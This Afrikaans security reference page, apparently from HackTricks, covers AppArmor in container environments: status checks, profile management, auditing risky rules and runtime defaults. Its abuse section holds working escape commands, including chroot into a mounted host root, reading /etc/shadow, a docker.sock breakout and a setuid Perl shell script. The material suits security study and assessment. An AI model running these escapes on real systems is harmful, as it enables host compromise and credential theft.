# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Oorsig

AppArmor is ’n **Verpligte Toegangsbeheer**-stelsel wat beperkings deur profiele per program toepas. Anders as tradisionele DAC-kontroles, wat sterk van gebruiker- en groepeienaarskap afhang, laat AppArmor die kernel ’n beleid afdwing wat aan die proses self gekoppel is. In houeromgewings is dit belangrik omdat ’n workload genoeg tradisionele voorregte kan hê om ’n handeling te probeer uitvoer, maar steeds geweier kan word omdat sy AppArmor-profiel nie die betrokke pad, mount, netwerkgedrag of gebruik van capabilities toelaat nie.

Die belangrikste konseptuele punt is dat AppArmor **padgebaseer** is. Dit beoordeel lêertoegang deur middel van padaanwysings eerder as etikette, soos SELinux doen. Dit maak AppArmor toeganklik en kragtig, maar beteken ook dat bind mounts en alternatiewe padaanlegte noukeurig aandag verdien. As dieselfde gasheerstelselinhoud onder ’n ander pad bereikbaar word, stem die uitwerking van die beleid dalk nie ooreen met wat die operateur aanvanklik verwag het nie.

## Rol in houerisolasie

Houer-sekuriteitsoorsigte stop dikwels by capabilities en seccomp, maar AppArmor bly ná daardie kontroles belangrik. Stel jou ’n houer voor wat meer voorregte het as wat dit behoort te hê, of ’n workload wat om operasionele redes een ekstra capability nodig gehad het. AppArmor kan steeds lêertoegang, mount-gedrag, netwerkverbinding en uitvoeringspatrone beperk op maniere wat die voor die hand liggende misbruikroete keer. Daarom kan die deaktivering van AppArmor “net om die toepassing aan die werk te kry” ’n bloot riskante konfigurasie stilweg omskep in een wat aktief uitbuitbaar is.

## Lab

Gebruik die volgende om na te gaan of AppArmor op die gasheer aktief is:

```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```

Om te sien onder watter profiel die huidige container-proses loop:

```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```

Die verskil is insiggewend. In die normale geval behoort die proses ’n AppArmor-konteks te toon wat gekoppel is aan die profiel wat deur die runtime gekies is. In die geval sonder beperkings verdwyn hierdie ekstra beperkingslaag.

Jy kan ook nagaan wat Docker dink dit toegepas het:

```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```

## Gebruik tydens looptyd

Docker kan ’n verstek- of pasgemaakte AppArmor-profiel toepas wanneer die gasheer dit ondersteun. Podman kan ook met AppArmor integreer op stelsels wat AppArmor gebruik, hoewel die ander MAC-stelsel dikwels sentraal staan op verspreidings wat SELinux vooropstel. Kubernetes kan AppArmor-beleid op werklasvlak beskikbaar stel op nodusse wat AppArmor werklik ondersteun. LXC en verwante Ubuntu-familie-omgewings vir stelselhouers gebruik AppArmor ook op groot skaal.

Die praktiese punt is dat AppArmor nie ’n "Docker-funksie" is nie. Dit is ’n gasheerkernelfunksie wat verskeie runtimes kan kies om toe te pas. As die gasheer dit nie ondersteun nie, of die runtime aangesê word om onbeperk te loop, is die beweerde beskerming nie werklik daar nie.

Vir Kubernetes spesifiek is die moderne API `securityContext.appArmorProfile`. Sedert Kubernetes `v1.30` is die ouer beta-AppArmor-annotasies verouderd. Op ondersteunde gashere is `RuntimeDefault` die verstekprofiel, terwyl `Localhost` verwys na ’n profiel wat reeds op die nodus gelaai moet wees. Dit is belangrik tydens ’n hersiening, want ’n manifest kan lyk asof dit AppArmor in ag neem, terwyl dit steeds geheel en al van ondersteuning op die nodus en voorafgelaaide profiele afhanklik is.<sup>[[1]](#references)</sup>

Een subtiele maar nuttige operasionele besonderheid is dat die eksplisiete instelling van `appArmorProfile.type: RuntimeDefault` strenger is as om die veld bloot weg te laat. As die veld eksplisiet ingestel is en die nodus nie AppArmor ondersteun nie, behoort toelating te misluk. As die veld weggelaat word, kan die werklas steeds op ’n nodus sonder AppArmor loop en bloot nie daardie ekstra inperkingslaag ontvang nie. Vanuit ’n aanvaller se oogpunt is dit ’n goeie rede om sowel die manifest as die werklike nodustoestand na te gaan.<sup>[[1]](#references)</sup>

Op Docker-geskikte AppArmor-gashere is `docker-default` die bekendste verstekprofiel. Daardie profiel word uit Moby se AppArmor-sjabloon gegenereer en is belangrik omdat dit verduidelik waarom sommige PoC’s wat op capabilities berus, steeds in ’n verstekhouer misluk. In breë trekke laat `docker-default` gewone netwerking toe, verbied dit skryfwerk na ’n groot deel van `/proc`, weier dit toegang tot sensitiewe dele van `/sys`, blokkeer dit mount-bewerkings en beperk dit ptrace sodat dit nie ’n algemene primitief vir gasheerverkenning is nie. Deur dié basislyn te verstaan, kan jy onderskei tussen "die houer het `CAP_SYS_ADMIN`" en "die houer kan daardie capability werklik gebruik teen die kernelkoppelvlakke waarin ek belangstel".

## Profielbestuur

AppArmor-profiele word gewoonlik onder `/etc/apparmor.d/` gestoor. ’n Algemene naamkonvensie is om skuinsstrepe in die uitvoerbare lêer se pad met punte te vervang. Byvoorbeeld, ’n profiel vir `/usr/bin/man` word gewoonlik as `/etc/apparmor.d/usr.bin.man` gestoor. Hierdie besonderheid is belangrik vir sowel verdediging as assessering, want sodra jy die naam van die aktiewe profiel ken, kan jy dikwels die ooreenstemmende lêer vinnig op die gasheer opspoor.

Nuttige bestuursopdragte aan die gasheerkant sluit in:

```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```

Die rede waarom hierdie opdragte belangrik is in ’n konteinersekuriteitsverwysing, is dat hulle verduidelik hoe profiele werklik gebou, gelaai, na complain mode oorgeskakel en ná toepassingsveranderings gewysig word. As ’n operateur die gewoonte het om profiele tydens probleemoplossing na complain mode oor te skakel en vergeet om afdwinging te herstel, kan die dokumentasie die indruk skep dat die konteiner beskerm is, terwyl dit in werklikheid baie minder streng optree.

### Bou en werk profiele by

`aa-genprof` kan toepassingsgedrag waarneem en help om ’n profiel interaktief te genereer:

```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```

`aa-easyprof` kan ’n sjabloonprofiel genereer wat later met `apparmor_parser` gelaai kan word:

```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```

Wanneer die binêre lêer verander en die beleid bygewerk moet word, kan `aa-logprof` weierings wat in logs gevind is, herspeel en die operateur help besluit of hulle toegelaat of geweier moet word:

```bash
sudo aa-logprof
```

### Logboeke

AppArmor-weierings is dikwels sigbaar via `auditd`, syslog of nutsmiddels soos `aa-notify`:

```bash
sudo aa-notify -s 1 -v
```

Dit is operasioneel en offensief nuttig. Verdedigers gebruik dit om profiele te verfyn. Aanvallers gebruik dit om uit te vind presies watter pad of bewerking geblokkeer word, en of AppArmor die beheermaatreël is wat ’n exploit chain blokkeer.

### Identifisering van die presiese profielêer

Wanneer ’n runtime ’n spesifieke AppArmor-profielnaam vir ’n container wys, is dit dikwels nuttig om daardie naam terug te koppel aan die profielêer op die skyf:

```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```

Dit is veral nuttig tydens hersiening vanaf die host, omdat dit die gaping oorbrug tussen “die container sê dat dit onder profiel `lowpriv` loop” en “die werklike reëls staan in hierdie spesifieke lêer wat geoudit of herlaai kan word”.

### Reëls met hoë seinwaarde om te oudit

Wanneer jy ’n profiel kan lees, moenie by eenvoudige `deny`-reëls ophou nie. Verskeie reëltipes verander wesenlik hoe nuttig AppArmor teen ’n poging tot container-ontsnapping sal wees:<sup>[[2]](#references)</sup>

- `ux` / `Ux`: voer die teikenbinary onbegrens uit. As ’n bereikbaar helper, shell of interpreter onder `ux` toegelaat word, is dit gewoonlik die eerste ding om te toets.
- `px` / `Px` en `cx` / `Cx`: voer profieloorgange tydens exec uit. Dit is nie outomaties sleg nie, maar dit is die moeite werd om te oudit, omdat ’n oorgang in ’n veel breër profiel as die huidige een kan beland.
- `change_profile`: laat ’n taak toe om onmiddellik of tydens die volgende exec na ’n ander gelaaide profiel oor te skakel. As die bestemmingsprofiel swakker is, kan dit die bedoelde ontsnappingsroete uit ’n beperkende domein word.
- `flags=(complain)`, `flags=(unconfined)` of nuwer `flags=(prompt)`: dit behoort te beïnvloed hoeveel vertroue jy in die profiel plaas. `complain` teken weierings aan in plaas daarvan om dit af te dwing, `unconfined` verwyder die grens, en `prompt` berus op ’n gebruikersruimte-besluitroete eerder as ’n weiering wat suiwer deur die kernel afgedwing word.
- `userns` of `userns create,`: nuwer AppArmor-beleid kan die skep van user namespaces beheer. As ’n container-profiel dit uitdruklik toelaat, bly geneste user namespaces moontlik, selfs wanneer die platform AppArmor as deel van sy hardening-strategie gebruik.

Nuttige grep vanaf die host:

```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```

Hierdie soort oudit is dikwels nuttiger as om na honderde gewone lêerreëls te staar. As ’n breakout daarvan afhang om ’n helper uit te voer, ’n nuwe namespace binne te gaan of na ’n minder beperkende profiel te ontsnap, lê die antwoord dikwels in hierdie oorganggerigte reëls eerder as in die ooglopende `deny /etc/shadow r`-tipe reëls.

## Wankonfigurasies

Die mees ooglopende fout is `apparmor=unconfined`. Administrateurs stel dit dikwels terwyl hulle ’n toepassing ontfout wat misluk het omdat die profiel iets gevaarliks of onverwags korrek geblokkeer het. As die vlag in produksie bly, is die hele MAC-laag effektief verwyder.

Nog ’n subtiele probleem is om aan te neem dat bind mounts onskadelik is omdat die lêertoestemmings normaal lyk. Omdat AppArmor padgebaseer is, kan die blootstelling van gasheerpaadjies onder alternatiewe mount-liggings swak saamwerk met padreëls. ’n Derde fout is om te vergeet dat ’n profielnaam in ’n konfigurasielêer baie min beteken as die gasheerkern AppArmor nie werklik afdwing nie.

## Misbruik

Wanneer AppArmor weg is, kan bewerkings wat voorheen beperk is skielik werk: die lees van sensitiewe paadjies deur bind mounts, toegang tot dele van procfs of sysfs wat moeiliker bereikbaar moes bly, die uitvoering van mount-verwante aksies as capabilities/seccomp dit ook toelaat, of die gebruik van paadjies wat ’n profiel normaalweg sou weier. AppArmor is dikwels die meganisme wat verduidelik waarom ’n capability-gebaseerde breakout-poging op papier behoort te werk, maar in die praktyk steeds misluk. Verwyder AppArmor, en dieselfde poging kan dalk begin slaag.

As jy vermoed dat AppArmor die hoofrede is waarom ’n path-traversal-, bind-mount- of mount-gebaseerde misbruiksketting geblokkeer word, is die eerste stap gewoonlik om te vergelyk wat toeganklik word met en sonder ’n profiel. As ’n gasheerpad byvoorbeeld binne die container gemount is, begin deur te kyk of jy daardeur kan navigeer en dit kan lees:

```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```

As die container ook ’n gevaarlike capability soos `CAP_SYS_ADMIN` het, is een van die mees praktiese toetse om vas te stel of AppArmor die beheermaatreël is wat mount-bewerkings of toegang tot sensitiewe kernel-lêerstelsels blokkeer:

```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```

In omgewings waar ’n gasheerpad reeds via ’n bind mount beskikbaar is, kan die verlies van AppArmor ook ’n leesalleen-inligtingsopenbaarmakingskwessie in direkte toegang tot gasheerlêers omskep:

```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```

Die punt van hierdie opdragte is nie dat AppArmor alleen die ontsnapping moontlik maak nie. Dit is dat baie misbruikpaaie wat op lêerstelsels en mountings berus, onmiddellik getoets kan word sodra AppArmor verwyder is.

### Volledige voorbeeld: AppArmor gedeaktiveer + host root gemount

As die host root reeds by `/host` in die container gemount is, kan die verwydering van AppArmor ’n geblokkeerde misbruikpad op die lêerstelsel in ’n volledige ontsnapping van die host omskep:

```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```

Sodra die shell via die gasheerlêerstelsel uitgevoer word, het die workload in werklikheid die containergrens ontsnap:

```bash
id
hostname
cat /etc/shadow | head
```

### Volledige voorbeeld: AppArmor gedeaktiveer + Runtime Socket

As AppArmor rondom runtime-state die werklike versperring was, kan ’n gemounte socket genoeg wees vir ’n volledige escape:

```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```

Die presiese pad hang van die mount point af, maar die eindresultaat is dieselfde: AppArmor verhoed nie meer toegang tot die runtime API nie, en die runtime API kan ’n container begin wat die host kan kompromitteer.

### Volledige voorbeeld: Bind-mount-omseiling op grond van die pad

Omdat AppArmor op grond van paaie werk, beskerm `/proc/**` nie outomaties dieselfde procfs-inhoud van die host wanneer dit via ’n ander pad bereikbaar is nie:

```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```

Die impak hang af van presies wat gemount is en of die alternatiewe pad ook ander kontroles omseil, maar hierdie patroon is een van die duidelikste redes waarom AppArmor saam met die mount-uitleg geëvalueer moet word, eerder as in isolasie.

### Volledige voorbeeld: Shebang Bypass

AppArmor kan ’n profiel aan die pad van die uitgevoerde script koppel, eerder as aan die interpreter wat deur die script se shebang benoem word. Omgekeerd kan die interpreter se profiel gekies word wanneer die interpreter direk aangeroep word. ’n [AppArmor-instandhouer beskryf hierdie onderskeid](https://bugs.launchpad.net/apparmor/+bug/1911431). ’n Historiese voorbeeld het ’n script behels waarvan die eerste reël na ’n beperkde interpreter verwys:

```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```

Die voorbeeld is slegs ’n kandidaat waar die lêervermoë van die interpreter effektief kan word en die werklike exec-aanhegting van die script die bewerking toelaat. Gaan die gelaaide beleid en prosesetiket, die capability-bounding set, `no_new_privs` en die mount se `nosuid`-status na; ’n profiel-lêernaam of `cap_setuid+ep`-inskrywing alleen bewys nie dat ’n bruikbare oorgang moontlik is nie. Interpreter-kettings en alternatiewe uitvoeringspaaie verdien afsonderlike ondersoek.

## Kontroles

Die doel van hierdie kontroles is om drie vrae vinnig te beantwoord: is AppArmor op die gasheer geaktiveer, is die huidige proses beperk, en het die runtime werklik ’n profiel op hierdie container toegepas?

```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```

Wat hier interessant is:

- As `/proc/self/attr/current` `unconfined` wys, trek die werklas nie voordeel uit AppArmor-beperking nie.
- As `aa-status` wys dat AppArmor gedeaktiveer is of nie gelaai is nie, is enige profielnaam in die runtime-konfigurasie grotendeels kosmeties.
- As `docker inspect` `unconfined` of ’n onverwagte pasgemaakte profiel wys, is dit dikwels die rede waarom ’n misbruikroete gebaseer op die lêerstelsel of mounts werk.
- As `/sys/kernel/security/apparmor/profiles` nie die profiel bevat wat jy verwag het nie, is die runtime- of orkestreerderkonfigurasie op sigself nie genoeg nie.
- As ’n profiel wat veronderstel is om verhard te wees `ux`, breë `change_profile`- of `userns`-reëls, of reëls in die styl van `flags=(complain)` bevat, kan die praktiese grens heelwat swakker wees as wat die profielnaam aandui.

As ’n container reeds om operasionele redes verhoogde voorregte het, maak dit dikwels die verskil tussen ’n beheerde uitsondering en ’n veel breër sekuriteitsfaling om AppArmor geaktiveer te laat.

## Verstekwaardes vir runtimes

| Runtime / platform | Verstektoestand | Verstekgedrag | Algemene handmatige verswakking |
| --- | --- | --- | --- |
| Docker Engine | By verstek geaktiveer op AppArmor-versoenbare gashere | Gebruik die `docker-default` AppArmor-profiel, tensy dit oorskryf word | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Afhanklik van die gasheer | AppArmor word via `--security-opt` ondersteun, maar die presiese verstek hang van die gasheer/runtime af en is minder universeel as Docker se gedokumenteerde `docker-default`-profiel | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Voorwaardelike verstek | As `appArmorProfile.type` nie gespesifiseer is nie, is die verstek `RuntimeDefault`, maar dit word slegs toegepas wanneer AppArmor op die node geaktiveer is | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` met ’n swak profiel, nodes sonder AppArmor-ondersteuning |
| containerd / CRI-O onder Kubernetes | Volg node-/runtime-ondersteuning | Algemene runtimes wat deur Kubernetes ondersteun word, ondersteun AppArmor, maar werklike afdwinging hang steeds van node-ondersteuning en werklasinstellings af | Dieselfde as die Kubernetes-ry; direkte runtime-konfigurasie kan AppArmor ook heeltemal oorslaan |

Vir AppArmor is die belangrikste veranderlike dikwels die **gasheer**, nie net die runtime nie. ’n Profielinstelling in ’n manifest skep nie beperking op ’n node waar AppArmor nie geaktiveer is nie.

## References

- [1] [Kubernetes-sekuriteitskonteks: AppArmor-profielvelde en node-ondersteuningsgedrag](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [2] [Ubuntu 24.04 `apparmor.d(5)`-manblad: exec-oorgange, `change_profile`, `userns` en profielfvlae](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
{{#include ../../../../banners/hacktricks-training.md}}
